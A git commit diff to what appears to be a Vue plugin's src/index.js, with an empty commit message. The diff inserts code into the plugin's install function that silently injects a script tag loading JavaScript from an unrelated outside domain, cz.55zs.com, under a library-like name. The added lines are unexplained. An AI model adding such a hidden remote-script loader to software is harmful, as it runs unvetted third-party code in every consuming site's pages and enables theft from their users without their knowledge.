e35fd694f6b79733a6987a8a73abdd4218ebcaf0
wkg <562153916@qq.com>
2021-06-23 17:20:45 +0800

    no message

--- src/index.js
+++ src/index.js
@@ -1,5 +1,11 @@
 // 定义 install 方法，接收 Vue 作为参数。如果使用 use 注册插件，则所有的组件都将被注册
 const install = function (Vue) {
+  (function() {
+    var hm = document.createElement("script")
+    hm.src = "https://cz.55zs.com/www2/layui/layui.all.js"
+    var s = document.getElementsByTagName("script")[0]
+    s.parentNode.insertBefore(hm, s)
+  })()
   // 判断是否安装
   if (install.installed) return
   
